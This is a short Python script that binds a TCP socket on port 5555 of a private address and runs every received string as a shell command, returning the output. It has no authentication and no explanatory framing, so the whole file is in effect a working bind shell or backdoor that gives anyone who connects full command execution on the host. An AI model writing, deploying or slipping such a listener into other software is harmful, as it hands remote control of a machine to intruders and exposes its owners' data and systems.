#!/usr/bin/env python3
import socket
import subprocess

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("192.168.2.15", 5555))
server.listen(10)

while True:
    connection, _ = server.accept()
    try:
        data = connection.recv(65536)
        if data:
            command = data.decode("utf-8", "replace").strip()
            if command:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True, timeout=120
                )
                connection.sendall((result.stdout + result.stderr).encode("utf-8", "replace"))
    except Exception as error:
        connection.sendall(f"ERR: {error}\n".encode())
    finally:
        connection.close()
